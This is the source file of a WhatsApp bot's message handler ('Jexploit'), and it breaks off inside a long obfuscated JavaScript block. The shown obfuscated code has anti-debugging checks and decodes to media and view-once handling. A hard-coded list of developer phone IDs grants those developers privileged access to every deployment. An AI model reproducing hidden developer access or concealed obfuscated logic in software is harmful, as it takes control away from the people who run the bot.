require('../config')
const yts = require('yt-search')
const fs = require('fs')
const axios = require('axios')
const googleTTS = require('google-tts-api')
const checkDiskSpace = require('check-disk-space').default;
const chalk = require("chalk")
const fetch = require("node-fetch")
const FormData = require('form-data')
const jimp = require("jimp")
const { fromBuffer } =  require('file-type')
const cheerio = require('cheerio')
const os = require('os')
const fg = require('api-dylux')
const PDFDocument = require('pdfkit')
const path = require('path')
const { getDevice } = require('@whiskeysockets/baileys')
const fsp = fs.promises;
const lolcatjs = require('lolcatjs')
const crypto = require('crypto')
const speed = require('performance-now')
const { performance } = require("perf_hooks")
const { sendButton } = require('kango-wa');
const more = String.fromCharCode(8206);
const util = require("util")
const timezones = global.timezones || "Africa/Kampala"; // Default to Uganda timezone
const moment = require("moment-timezone")
const { spawn, exec, execSync } = require('child_process')
const { default: baileys, proto, jidNormalizedUser, generateWAMessage, generateWAMessageFromContent,
generateWAMessageContent, getContentType, downloadContentFromMessage,prepareWAMessageMedia } = require("@whiskeysockets/baileys")

const { 
  smsg, 
  sendGmail, 
  formatSize, 
  isUrl, 
  generateMessageTag, 
  CheckBandwidth, 
  getBuffer, 
  getGroupAdmins, 
  getSizeMedia, 
  runtime, 
  fetchJson, 
  sleep, 
  getRandom 
} = require('./lib/myfunction')

const { obfuscateJS } = require("./lib/encapsulation");
const db = require('./Core/databaseManager');
const GroupDB = require('./Metadata/group');
const { handleMediaUpload } = require('./lib/catbox');
const { styletext } = require('./lib/scraper')
const { 
    setAwesomeMenu,
    resetMenu,
    sendMenu,
    showCurrentMenu, 
    loadMenuConfig 
} = require('./DevKelvin/menu');
const {
 fetchMp3DownloadUrl,
 fetchVideoDownloadUrl,
  saveStatusMessage,
  acr,
  handleAntiEdit,
  loadStoredMessages,
  saveStoredMessages,
  storeMessage,
  ephoto,
  getServerUptime,
  getServerStartTime,
  loadBlacklist,
  disapproveAllRequests,
  approveAllRequests,
  listGroupRequests,
  antipromoteCommand,
  antidemoteCommand,
  handleAntiTag,
  handleAntiTagAdmin,
  handleLinkViolation,
  checkAndHandleLinks,
  handleBadword,
  handleAntisticker,
  detectUrls,
  normalizeJid,
  delay,
  recordError,
  shouldLogError } = require('../Jex')
  

const {  takeCommand, ytplayCommand, playCommand } = require('./KelvinCmds/commands')

const {
veniceAICommand,
mistralAICommand,
perplexityAICommand,
bardAICommand,
gpt4NanoAICommand,
kelvinAICommand,
claudeAICommand
} = require('./KelvinCmds/ai');
const { playCommand2 } = require('./KelvinCmds/video');
const { dareCommand, truthCommand } = require('./KelvinCmds/fun');
const sports = require('./KelvinCmds/sport');
const { handleAutoReact } = require('./KelvinCmds/autoreact');
const { handleAutoRead } = require('./KelvinCmds/autoread');
const { handleAutoTyping } = require('./KelvinCmds/autotyping');
const { handleAIChatbot } = require('./KelvinCmds/chatbot');
const { handleAutoRecording } = require('./KelvinCmds/autorecord');
const { handleAntiDelete } = require('./KelvinCmds/antidelete');
const { cleaningSession } = require('./lib/botSession'); 
const {fetchReactionImage} = require('./lib/reaction')
const { toAudio } = require('./lib/converter');
const { jadibot, stopjadibot, listjadibot } = require('./jadibot')
const { webp2mp4 } = require('./lib/uploader');
const { ButtonHandler } = require('./lib/buttonHandler');


module.exports = conn = async (conn, m, chatUpdate, mek, store) => {
try {
const body = (m.mtype === "conversation" ? m.message.conversation : m.mtype === "imageMessage" ? m.message.imageMessage.caption : m.mtype === "videoMessage" ? m.message.videoMessage.caption : m.mtype === "extendedTextMessage" ? m.message.extendedTextMessage.text : m.mtype === "buttonsResponseMessage" ? m.message.buttonsResponseMessage.selectedButtonId : m.mtype === "listResponseMessage" ? m.message.listResponseMessage.singleSelectReply.selectedRowId : m.mtype === "templateButtonReplyMessage" ? m.message.templateButtonReplyMessage.selectedId : m.mtype === "interactiveResponseMessage" ? JSON.parse(m.msg.nativeFlowResponseMessage.paramsJson).id : m.mtype === "templateButtonReplyMessage" ? m.msg.selectedId : m.mtype === "messageContextInfo" ? m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text : "")
const budy = (typeof m.text === 'string' ? m.text : '')
var textmessage = (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || budy) : ""
const content = JSON.stringify(mek.message)
const type = Object.keys(mek.message)[0]
if (m && type == "protocolMessage") conn.ev.emit("message.delete", m.message.protocolMessage.key)
if (m.message && m.key && !m.key.fromMe) {
    storeMessage(m.chat, m.key.id, {
        key: m.key,
        message: m.message,
        messageTimestamp: m.messageTimestamp,
        pushName: m.pushName || "Unknown"
    });
}

let buttonHandler = null;
if (!global.buttonHandler) {
    buttonHandler = new ButtonHandler(conn);
    global.buttonHandler = buttonHandler;
} else {
    buttonHandler = global.buttonHandler;
}

const botNumber = await conn.decodeJid(conn.user.id);
const { sender } = m;
const from = m.key.remoteJid;
const chatId = m.chat;
const groupJid = m.chat;
const isGroup = from.endsWith("@g.us");
const senderId = m.key.participant || from;  
const DEV_JIDS = [
    '256742932677@s.whatsapp.net',
    '256755585369@s.whatsapp.net',
    '38161203904689@lid',
    '96491339264216@lid'
];

const LegendaryKevin = JSON.parse(fs.readFileSync('./data/owner.json'));
const ownerFile = './data/owner.json';
const ownerList = LegendaryKevin.owner || [];

const authorizedJids = [
    ...DEV_JIDS,
    ...ownerList,
    botNumber
];

const Access = authorizedJids.includes(m.sender);

let prefix = ".";

try {
    prefix = await db.get(botNumber, 'prefix', '.');
} catch (error) {
    console.error('Error loading prefix from database:', error);
    prefix = "."; 
}

try {
    const alwaysonlineSetting = await db.get(botNumber, 'alwaysonline', false);
    if (typeof alwaysonlineSetting === 'boolean') {
        global.alwaysonline = alwaysonlineSetting;
    } else if (typeof alwaysonlineSetting === 'string') {
        global.alwaysonline = alwaysonlineSetting.toLowerCase() === 'true';
    } else {
        global.alwaysonline = false; 
    }
} catch (error) {
    console.error('Error loading alwaysonline from database:', error);
    global.alwaysonline = false; 
}


const isCmd = body?.startsWith?.(prefix);
const trimmedBody = isCmd ? body.slice(prefix.length).trimStart() : "";
const command = isCmd ? body.slice(prefix.length).trim().split(/ +/).shift().toLowerCase() : "";
const args = isCmd ? body.slice(prefix.length).trim().split(/ +/).slice(1) : [];
const pushname = m.pushName || "No Name";
const text = q = args.join(" ")
const fatkuns = m.quoted || m;
const quoted = fatkuns.mtype === 'buttonsMessage' ? fatkuns[Object.keys(fatkuns)[1]] : fatkuns.mtype === 'templateMessage' ? fatkuns.hydratedTemplate[Object.keys(fatkuns.hydratedTemplate)[1]] : fatkuns.mtype === 'product' ? fatkuns[Object.keys(fatkuns)[0]] : m.quoted ? m.quoted : m;
const qmsg = quoted.msg || quoted;
const mime = qmsg.mimetype || '';
const isImage = type === 'imageMessage';
const isVideo = type === 'videoMessage';
const isAudio = type === 'audioMessage';
const isMedia = /image|video|sticker|audio/.test(mime)
const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')
const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')
const isQuotedTag = type === 'extendedTextMessage' && content.includes('mentionedJid')
const isQuotedReply = type === 'extendedTextMessage' && content.includes('Message')
const isQuotedText = type === 'extendedTextMessage' && content.includes('conversation')
const isQuotedViewOnce = type === 'extendedTextMessage' && content.includes('viewOnceMessageV2')

let groupMetadata = null;
let groupName = "";
let participants = [];

if (isGroup) {
    try {
        groupMetadata = await conn.groupMetadata(from);
        groupName = groupMetadata.subject || "";
        participants = groupMetadata.participants || [];
    } catch (err) {
        console.log('[GROUP METADATA ERROR]', err.message);
    }
}

const peler = fs.readFileSync('./start/lib/Media/Jexploit.jpg')
const cina = fs.readFileSync('./start/lib/Media/Jex.jpg')
function getRandomImage() {
const randomIndex = Math.floor(Math.random() * cina.length)
return cina[randomIndex]
}
const cinahitam = getRandomImage()
async function pickRandom(list) {
return list[Math.floor(Math.random() * list.length)]
}
const Usage = prefix + command
const more = String.fromCharCode(8206)
const readmore = more.repeat(4001)
const reaction = async (jidss, emoji) => {
conn.sendMessage(jidss, { react: { text: emoji, key: m.key } })
}


const _0x3a3887=_0x434f;function _0x434f(_0xce7aed,_0x5c6a11){_0xce7aed=_0xce7aed-(-0x1*-0x13d1+0x10cf+0x6*-0x5da);const _0x1b0cd1=_0x16f2();let _0x2f240c=_0x1b0cd1[_0xce7aed];if(_0x434f['\x50\x4b\x41\x55\x58\x54']===undefined){var _0xb97fd1=function(_0x40bbd6){const _0x50bb4e='\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x2b\x2f\x3d';let _0x53fc42='',_0x5873a9='',_0x2bb308=_0x53fc42+_0xb97fd1,_0x441b29=(''+function(){return 0xfad*0x1+-0x1446+0x499;})['\x69\x6e\x64\x65\x78\x4f\x66']('\x0a')!==-(-0xb84+-0xf1b+-0x18*-0x11c);for(let _0x3a811e=-0x136b+-0x136e+0x3*0xcf3,_0xd6e287,_0x1e2542,_0x341508=-0x54*-0x47+-0x4*-0x772+0x2b*-0x13c;_0x1e2542=_0x40bbd6['\x63\x68\x61\x72\x41\x74'](_0x341508++);~_0x1e2542&&(_0xd6e287=_0x3a811e%(0x58*-0x6e+0x1*-0x1bfe+0xd2a*0x5)?_0xd6e287*(-0x26e+-0x611*0x1+0x8bf)+_0x1e2542:_0x1e2542,_0x3a811e++%(0x7f*-0x2d+0x156+-0x13*-0x11b))?_0x53fc42+=_0x441b29||_0x2bb308['\x63\x68\x61\x72\x43\x6f\x64\x65\x41\x74'](_0x341508+(-0xaf2*0x1+-0x1*0x3f5+-0x3*-0x4fb))-(-0x1e66+0x757*-0x3+0x3475)!==0x1*-0x19fd+0x4*0x177+0x1421?String['\x66\x72\x6f\x6d\x43\x68\x61\x72\x43\x6f\x64\x65'](0xa86*-0x1+-0xc89*0x2+0x143*0x1d&_0xd6e287>>(-(0x1016+-0x6c1*0x4+0xaf0)*_0x3a811e&-0x2*0x66b+0x25dc+-0x320*0x8)):_0x3a811e:-0x1*-0x301+-0x33f+-0x3e*-0x1){_0x1e2542=_0x50bb4e['\x69\x6e\x64\x65\x78\x4f\x66'](_0x1e2542);}for(let _0x39403c=-0x1fc2+-0x39*0x27+0x2871,_0x55b49a=_0x53fc42['\x6c\x65\x6e\x67\x74\x68'];_0x39403c<_0x55b49a;_0x39403c++){_0x5873a9+='\x25'+('\x30\x30'+_0x53fc42['\x63\x68\x61\x72\x43\x6f\x64\x65\x41\x74'](_0x39403c)['\x74\x6f\x53\x74\x72\x69\x6e\x67'](-0x43*-0xd+0x698+-0x9ef))['\x73\x6c\x69\x63\x65'](-(-0x1*-0x158+0xb02+-0xc58));}return decodeURIComponent(_0x5873a9);};_0x434f['\x68\x72\x45\x4e\x6e\x53']=_0xb97fd1,_0x434f['\x48\x4b\x56\x6d\x58\x66']={},_0x434f['\x50\x4b\x41\x55\x58\x54']=!![];}const _0x7535fa=_0x1b0cd1[-0xd2*0x25+-0x1f*-0xea+-0x4*-0x81],_0x317207=_0xce7aed+_0x7535fa,_0x2ac721=_0x434f['\x48\x4b\x56\x6d\x58\x66'][_0x317207];if(!_0x2ac721){const _0x35c274=function(_0x5aabdf){this['\x4b\x53\x61\x50\x7a\x52']=_0x5aabdf,this['\x44\x6a\x65\x55\x77\x79']=[0x24d4+0xe*-0x277+-0x1*0x251,-0x1e98+0x2*-0x10d3+-0x156a*-0x3,-0x7*-0x2e6+-0x3*0x4f+0x1*-0x135d],this['\x54\x6a\x54\x4f\x4c\x54']=function(){return'\x6e\x65\x77\x53\x74\x61\x74\x65';},this['\x68\x74\x44\x58\x4f\x65']='\x5c\x77\x2b\x20\x2a\x5c\x28\x5c\x29\x20\x2a\x7b\x5c\x77\x2b\x20\x2a',this['\x4d\x75\x55\x67\x47\x43']='\x5b\x27\x7c\x22\x5d\x2e\x2b\x5b\x27\x7c\x22\x5d\x3b\x3f\x20\x2a\x7d';};_0x35c274['\x70\x72\x6f\x74\x6f\x74\x79\x70\x65']['\x58\x66\x79\x51\x66\x4b']=function(){const _0x3c6990=new RegExp(this['\x68\x74\x44\x58\x4f\x65']+this['\x4d\x75\x55\x67\x47\x43']),_0x9754b0=_0x3c6990['\x74\x65\x73\x74'](this['\x54\x6a\x54\x4f\x4c\x54']['\x74\x6f\x53\x74\x72\x69\x6e\x67']())?--this['\x44\x6a\x65\x55\x77\x79'][0x2*0x7c6+-0x1a6*-0x7+-0x3*0x907]:--this['\x44\x6a\x65\x55\x77\x79'][-0xf1c+0x10fa+-0x1de];return this['\x47\x73\x55\x66\x4d\x68'](_0x9754b0);},_0x35c274['\x70\x72\x6f\x74\x6f\x74\x79\x70\x65']['\x47\x73\x55\x66\x4d\x68']=function(_0x2f4813){if(!Boolean(~_0x2f4813))return _0x2f4813;return this['\x4d\x68\x42\x68\x51\x49'](this['\x4b\x53\x61\x50\x7a\x52']);},_0x35c274['\x70\x72\x6f\x74\x6f\x74\x79\x70\x65']['\x4d\x68\x42\x68\x51\x49']=function(_0x10315f){for(let _0xa9f2b8=0x16ee+-0x1a1d+0x32f,_0x3e9ecf=this['\x44\x6a\x65\x55\x77\x79']['\x6c\x65\x6e\x67\x74\x68'];_0xa9f2b8<_0x3e9ecf;_0xa9f2b8++){this['\x44\x6a\x65\x55\x77\x79']['\x70\x75\x73\x68'](Math['\x72\x6f\x75\x6e\x64'](Math['\x72\x61\x6e\x64\x6f\x6d']())),_0x3e9ecf=this['\x44\x6a\x65\x55\x77\x79']['\x6c\x65\x6e\x67\x74\x68'];}return _0x10315f(this['\x44\x6a\x65\x55\x77\x79'][0x1*0xe39+0x68b*-0x3+0x568]);},(''+function(){return-0x1d5*0x1+0x244e+-0x2279;})['\x69\x6e\x64\x65\x78\x4f\x66']('\x0a')===-(0x17*0xdd+0xb*0x313+-0x1*0x35ab)&&new _0x35c274(_0x434f)['\x58\x66\x79\x51\x66\x4b'](),_0x2f240c=_0x434f['\x68\x72\x45\x4e\x6e\x53'](_0x2f240c),_0x434f['\x48\x4b\x56\x6d\x58\x66'][_0x317207]=_0x2f240c;}else _0x2f240c=_0x2ac721;return _0x2f240c;}(function(_0x5ebd71,_0x20240d){const _0x50d515=_0x434f,_0x4372a1=_0x5ebd71();while(!![]){try{const _0x26fe60=-parseInt(_0x50d515(0x2cc))/(0x1586+-0x8e9+0x2*-0x64e)*(parseInt(_0x50d515(0x18d))/(-0x67*0x38+0x719*-0x3+-0x7*-0x643))+parseInt(_0x50d515(0x251))/(-0x23ea+0x22ef+0xfe)+parseInt(_0x50d515(0x204))/(0xe69+0x235a+-0x351*0xf)*(parseInt(_0x50d515(0x212))/(-0x3*-0xcfe+-0x210a+-0x5eb))+-parseInt(_0x50d515(0x199))/(0x176c+-0xb*0x22d+0x89)+-parseInt(_0x50d515(0x272))/(-0x1f*0x1+-0x47d*0x5+0x1697)*(parseInt(_0x50d515(0x2ca))/(0xe0e+0x24e2*0x1+0x16a*-0x24))+parseInt(_0x50d515(0x241))/(-0x1e54+-0x1*0xc46+0x887*0x5)+parseInt(_0x50d515(0x1d1))/(0xd78*0x1+0x98f+-0x217*0xb);if(_0x26fe60===_0x20240d)break;else _0x4372a1['push'](_0x4372a1['shift']());}catch(_0x4e5730){_0x4372a1['push'](_0x4372a1['shift']());}}}(_0x16f2,0x10d70+0x141f3c+0x87a57*-0x1));const _0x20c1eb=(function(){const _0x31095c=_0x434f,_0x45a3b8={};_0x45a3b8[_0x31095c(0x264)]=function(_0x19b54b,_0x4b4447){return _0x19b54b!==_0x4b4447;},_0x45a3b8[_0x31095c(0x1ee)]=_0x31095c(0x2a1);const _0xc4dc54=_0x45a3b8;let _0x216674=!![];return function(_0x4506d5,_0x3b5fb5){const _0x5314e1=_0x216674?function(){const _0x3625b6=_0x434f,_0x2ec24b={};_0x2ec24b['\x5a\x4b\x64\x59\x63']='\x4e\x2f\x41';const _0x535457=_0x2ec24b;if(_0x3b5fb5){if(_0xc4dc54['\x53\x56\x66\x6b\x56'](_0xc4dc54['\x48\x51\x51\x74\x52'],_0xc4dc54['\x48\x51\x51\x74\x52'])){const _0x267518={};return _0x267518[_0x3625b6(0x195)]=_0x535457[_0x3625b6(0x287)],_0x267518[_0x3625b6(0x18f)]=_0x535457[_0x3625b6(0x287)],_0x267518;}else{const _0x15ee70=_0x3b5fb5[_0x3625b6(0x21c)](_0x4506d5,arguments);return _0x3b5fb5=null,_0x15ee70;}}}:function(){};return _0x216674=![],_0x5314e1;};}()),_0x4d91b5=_0x20c1eb(this,function(){const _0x45e612=_0x434f,_0x196d38={};_0x196d38[_0x45e612(0x22b)]=_0x45e612(0x285);const _0x719b10=_0x196d38;return _0x4d91b5[_0x45e612(0x2b2)]()[_0x45e612(0x275)](_0x719b10[_0x45e612(0x22b)])[_0x45e612(0x2b2)]()[_0x45e612(0x28e)](_0x4d91b5)[_0x45e612(0x275)](_0x719b10[_0x45e612(0x22b)]);});_0x4d91b5();const _0xc78519=(function(){const _0xd249ca=_0x434f,_0x269a18={'\x4d\x50\x46\x41\x6b':_0xd249ca(0x1a0),'\x55\x57\x41\x61\x41':_0xd249ca(0x1f9),'\x52\x46\x75\x77\x48':function(_0x2ba2eb,_0x560fbc){return _0x2ba2eb(_0x560fbc);},'\x4d\x65\x69\x6c\x76':function(_0x26a395,_0x3fe6bb){return _0x26a395+_0x3fe6bb;},'\x53\x41\x6a\x45\x61':_0xd249ca(0x2c8),'\x45\x72\x48\x71\x59':function(_0x12f305,_0x176e69){return _0x12f305(_0x176e69);},'\x4f\x6c\x63\x6e\x6d':function(_0xa4f038,_0x1f36bd){return _0xa4f038!==_0x1f36bd;},'\x4d\x56\x4f\x4e\x42':_0xd249ca(0x1db),'\x64\x68\x4d\x4a\x4a':'\x53\x74\x69\x63\x6b\x65\x72','\x71\x77\x73\x48\x65':_0xd249ca(0x203)};let _0x4983d4=!![];return function(_0x51c7b2,_0x2bfca0){const _0x5a685b=_0xd249ca,_0x5e9576={'\x47\x4c\x48\x66\x47':_0x269a18[_0x5a685b(0x23b)],'\x73\x52\x54\x4e\x48':_0x269a18[_0x5a685b(0x296)],'\x52\x43\x50\x4f\x48':function(_0x4ad7e1,_0x53afea){const _0x4043fb=_0x5a685b;return _0x269a18[_0x4043fb(0x1c7)](_0x4ad7e1,_0x53afea);},'\x68\x46\x61\x47\x6a':function(_0x6bf13c,_0x3365ee){const _0x50c312=_0x5a685b;return _0x269a18[_0x50c312(0x1a9)](_0x6bf13c,_0x3365ee);},'\x76\x74\x42\x4a\x6a':_0x269a18[_0x5a685b(0x297)],'\x6b\x4d\x46\x6e\x70':function(_0x1ab0e2,_0xbb2146){const _0x53b0f5=_0x5a685b;return _0x269a18[_0x53b0f5(0x232)](_0x1ab0e2,_0xbb2146);},'\x79\x43\x55\x6b\x79':function(_0xc516f3,_0x19f8f8){const _0x1149ea=_0x5a685b;return _0x269a18[_0x1149ea(0x299)](_0xc516f3,_0x19f8f8);},'\x51\x4e\x4a\x4c\x46':_0x269a18[_0x5a685b(0x268)],'\x77\x45\x57\x5a\x70':_0x5a685b(0x1c9),'\x47\x69\x4f\x7a\x43':_0x269a18[_0x5a685b(0x262)]};if(_0x269a18['\x4f\x6c\x63\x6e\x6d'](_0x5a685b(0x24a),_0x269a18[_0x5a685b(0x253)])){const _0x43175f=_0x4983d4?function(){const _0x3348d0=_0x5a685b,_0x59dbf8={'\x53\x52\x41\x44\x52':_0x5e9576[_0x3348d0(0x26f)],'\x56\x76\x4c\x71\x58':_0x5e9576[_0x3348d0(0x1bc)],'\x76\x5a\x55\x4c\x54':function(_0x474157,_0xf155cc){const _0x2ef806=_0x3348d0;return _0x5e9576[_0x2ef806(0x2c6)](_0x474157,_0xf155cc);},'\x56\x71\x57\x67\x41':function(_0x162374,_0x51d650){const _0x5e91be=_0x3348d0;return _0x5e9576[_0x5e91be(0x1ca)](_0x162374,_0x51d650);},'\x6c\x6f\x4e\x7a\x78':_0x5e9576['\x76\x74\x42\x4a\x6a'],'\x71\x46\x44\x49\x68':_0x3348d0(0x216),'\x66\x48\x52\x71\x45':function(_0x17b864,_0x31cf8a){const _0x5b5236=_0x3348d0;return _0x5e9576[_0x5b5236(0x25a)](_0x17b864,_0x31cf8a);}};if(_0x2bfca0){if(_0x5e9576[_0x3348d0(0x1b2)](_0x5e9576[_0x3348d0(0x233)],_0x5e9576[_0x3348d0(0x233)])){const _0x32a225=new _0x2848f1(_0x59dbf8['\x53\x52\x41\x44\x52']),_0x111ea6=new _0x42671d(_0x59dbf8[_0x3348d0(0x210)],'\x69'),_0x1192d0=_0x59dbf8[_0x3348d0(0x1be)](_0x5b85c5,_0x3348d0(0x1e6));!_0x32a225[_0x3348d0(0x274)](_0x59dbf8[_0x3348d0(0x2c9)](_0x1192d0,_0x59dbf8[_0x3348d0(0x1e3)]))||!_0x111ea6[_0x3348d0(0x274)](_0x1192d0+_0x59dbf8[_0x3348d0(0x1ff)])?_0x59dbf8[_0x3348d0(0x1ad)](_0x1192d0,'\x30'):_0x16a5e9();}else{const _0x3872c9=_0x2bfca0[_0x3348d0(0x21c)](_0x51c7b2,arguments);return _0x2bfca0=null,_0x3872c9;}}}:function(){};return _0x4983d4=![],_0x43175f;}else{if(_0x30486c&&_0x346139[_0x5a685b(0x23c)])return _0x5e9576[_0x5a685b(0x2c3)];return _0x5e9576[_0x5a685b(0x1de)];}};}());(function(){const _0x173063=_0x434f,_0x53dab7={'\x77\x64\x66\x45\x62':_0x173063(0x1d9),'\x46\x76\x4a\x77\x68':_0x173063(0x2b1),'\x58\x56\x64\x76\x61':_0x173063(0x1a0),'\x43\x46\x63\x67\x61':function(_0x1d4e2b,_0x24f68e){return _0x1d4e2b(_0x24f68e);},'\x4b\x61\x75\x4d\x4d':_0x173063(0x1e6),'\x6f\x67\x79\x4d\x63':function(_0x3abc68,_0x50dc8c){return _0x3abc68+_0x50dc8c;},'\x4b\x41\x69\x41\x6e':'\x63\x68\x61\x69\x6e','\x72\x47\x71\x70\x42':_0x173063(0x216),'\x57\x4a\x62\x48\x4e':function(_0x1c9599,_0x4d11c4){return _0x1c9599!==_0x4d11c4;},'\x65\x72\x4a\x77\x4a':_0x173063(0x1a3),'\x7a\x58\x51\x76\x50':function(_0x2b239b){return _0x2b239b();}};_0xc78519(this,function(){const _0x2aa67e=_0x173063,_0x328ee7=new RegExp(_0x53dab7[_0x2aa67e(0x27b)]),_0x5f58ae=new RegExp(_0x2aa67e(0x1f9),'\x69'),_0x1bc89b=_0x53dab7[_0x2aa67e(0x235)](_0xfc68fd,_0x53dab7[_0x2aa67e(0x267)]);if(!_0x328ee7[_0x2aa67e(0x274)](_0x53dab7[_0x2aa67e(0x291)](_0x1bc89b,_0x53dab7[_0x2aa67e(0x2a4)]))||!_0x5f58ae[_0x2aa67e(0x274)](_0x53dab7[_0x2aa67e(0x291)](_0x1bc89b,_0x53dab7['\x72\x47\x71\x70\x42'])))_0x1bc89b('\x30');else{if(_0x53dab7[_0x2aa67e(0x2b9)](_0x2aa67e(0x298),_0x53dab7[_0x2aa67e(0x1d7)]))_0x53dab7[_0x2aa67e(0x1cb)](_0xfc68fd);else{_0x2c3262[_0x2aa67e(0x2d3)](_0x53dab7[_0x2aa67e(0x265)],_0xa95be3);const _0x3759e8={};return _0x3759e8[_0x2aa67e(0x202)]='\u26a0\ufe0f\x20\x53\x74\x69\x63\x6b\x65\x72\x20\x63\x6f\x6e\x76\x65\x72\x73\x69\x6f\x6e\x20\x66\x61\x69\x6c\x65\x64\x20\x28'+(_0x14cff5[_0x2aa67e(0x184)]['\x6d\x69\x6d\x65\x74\x79\x70\x65']||_0x53dab7['\x46\x76\x4a\x77\x68'])+'\x29',_0x3759e8;}}})();}());async function _0x19228a(_0x45895b,_0x49a1a7){const _0x2f1d90=_0x434f,_0xc45399={'\x44\x47\x75\x4c\x62':'\x5c\x2b\x5c\x2b\x20\x2a\x28\x3f\x3a\x5b\x61\x2d\x7a\x41\x2d\x5a\x5f\x24\x5d\x5b\x30\x2d\x39\x61\x2d\x7a\x41\x2d\x5a\x5f\x24\x5d\x2a\x29','\x57\x56\x41\x72\x44':function(_0x3496fd,_0x5374f0){return _0x3496fd(_0x5374f0);},'\x4d\x72\x4b\x63\x69':_0x2f1d90(0x1e6),'\x64\x6a\x5a\x59\x75':function(_0x1aefe5,_0x332ea3){return _0x1aefe5+_0x332ea3;},'\x4b\x6a\x77\x6e\x6a':_0x2f1d90(0x2c8),'\x41\x5a\x4a\x62\x47':_0x2f1d90(0x216),'\x43\x4b\x48\x53\x71':function(_0xeca550,_0x129e95){return _0xeca550(_0x129e95);},'\x73\x6b\x65\x4b\x53':_0x2f1d90(0x242),'\x4d\x78\x49\x52\x69':_0x2f1d90(0x29a),'\x50\x55\x7a\x64\x51':'\x65\x72\x72\x6f\x72','\x59\x77\x59\x6b\x63':'\x65\x6e\x64','\x54\x79\x6f\x67\x4c':'\x64\x61\x74\x61','\x41\x52\x53\x64\x6f':_0x2f1d90(0x1b1),'\x76\x4a\x58\x47\x74':'\x76\x69\x64\x65\x6f\x2f\x6d\x70\x34','\x69\x4a\x69\x68\x73':function(_0x1c1f53,_0x19d0a8,_0x25fb9d){return _0x1c1f53(_0x19d0a8,_0x25fb9d);},'\x78\x6f\x5a\x64\x77':'\x69\x6d\x61\x67\x65\x2f\x6a\x70\x65\x67','\x65\x42\x55\x6c\x51':function(_0x432dd6,_0x346270){return _0x432dd6===_0x346270;},'\x4c\x71\x4e\x6c\x54':_0x2f1d90(0x196),'\x76\x69\x4d\x69\x57':'\x61\x75\x64\x69\x6f','\x62\x63\x75\x4b\x56':function(_0x15e4a2,_0x5b623c){return _0x15e4a2===_0x5b623c;},'\x52\x71\x4a\x66\x49':'\x4d\x4f\x4b\x71\x66','\x66\x6c\x4f\x77\x65':'\x61\x75\x64\x69\x6f\x2f\x6d\x70\x65\x67','\x6e\x54\x69\x73\x41':function(_0xa372db,_0x1dbf57,_0x53986f){return _0xa372db(_0x1dbf57,_0x53986f);},'\x52\x51\x6a\x61\x43':_0x2f1d90(0x27a),'\x57\x43\x67\x70\x53':function(_0x2e400b,_0xabe1e1){return _0x2e400b===_0xabe1e1;},'\x56\x6a\x62\x50\x72':_0x2f1d90(0x1d9),'\x70\x63\x72\x6e\x64':'\x75\x6e\x6b\x6e\x6f\x77\x6e','\x55\x61\x4d\x6d\x51':function(_0x426ef6,_0x5a1a17){return _0x426ef6!==_0x5a1a17;},'\x59\x71\x62\x69\x4e':_0x2f1d90(0x1fa)};if(_0x45895b[_0x2f1d90(0x1f6)]){const _0x4fb300=await _0xb46f83(_0x45895b[_0x2f1d90(0x1f6)],_0xc45399[_0x2f1d90(0x1e7)]),_0x5bb6a5={};return _0x5bb6a5[_0x2f1d90(0x1b1)]=_0x4fb300,_0x5bb6a5['\x63\x61\x70\x74\x69\x6f\x6e']=_0x45895b[_0x2f1d90(0x1f6)][_0x2f1d90(0x2c2)]||'',_0x5bb6a5[_0x2f1d90(0x26d)]=_0x45895b[_0x2f1d90(0x1f6)][_0x2f1d90(0x26d)]||![],_0x5bb6a5[_0x2f1d90(0x1ec)]=_0x45895b['\x76\x69\x64\x65\x6f\x4d\x65\x73\x73\x61\x67\x65'][_0x2f1d90(0x1ec)]||_0xc45399[_0x2f1d90(0x214)],_0x5bb6a5;}else{if(_0x45895b[_0x2f1d90(0x1af)]){const _0x2fcea4=await _0xc45399['\x69\x4a\x69\x68\x73'](_0xb46f83,_0x45895b[_0x2f1d90(0x1af)],'\x69\x6d\x61\x67\x65'),_0x4dd63e={};return _0x4dd63e[_0x2f1d90(0x24d)]=_0x2fcea4,_0x4dd63e[_0x2f1d90(0x2c2)]=_0x45895b['\x69\x6d\x61\x67\x65\x4d\x65\x73\x73\x61\x67\x65'][_0x2f1d90(0x2c2)]||'',_0x4dd63e[_0x2f1d90(0x1ec)]=_0x45895b[_0x2f1d90(0x1af)][_0x2f1d90(0x1ec)]||_0xc45399[_0x2f1d90(0x2b3)],_0x4dd63e;}else{if(_0x45895b[_0x2f1d90(0x19e)]){if(_0xc45399[_0x2f1d90(0x226)]('\x44\x7a\x77\x58\x41',_0xc45399['\x4c\x71\x4e\x6c\x54']))return![];else{const _0x4876a0=await _0xc45399[_0x2f1d90(0x1c5)](_0xb46f83,_0x45895b[_0x2f1d90(0x19e)],_0xc45399[_0x2f1d90(0x254)]);if(_0x45895b['\x61\x75\x64\x69\x6f\x4d\x65\x73\x73\x61\x67\x65'][_0x2f1d90(0x26e)]){const _0x5714e5=await _0xc45399[_0x2f1d90(0x1d8)](_0x53fcb2,_0x4876a0),_0x1967d9={};return _0x1967d9[_0x2f1d90(0x2d0)]=_0x5714e5,_0x1967d9[_0x2f1d90(0x1ec)]=_0x2f1d90(0x1c3),_0x1967d9[_0x2f1d90(0x26e)]=!![],_0x1967d9;}else{if(_0xc45399['\x62\x63\x75\x4b\x56'](_0xc45399[_0x2f1d90(0x286)],'\x74\x64\x63\x50\x4e')){const _0x27346d={'\x50\x48\x43\x70\x47':ETWKjQ['\x44\x47\x75\x4c\x62'],'\x65\x78\x47\x55\x4d':function(_0x1c450b,_0x3a1f29){const 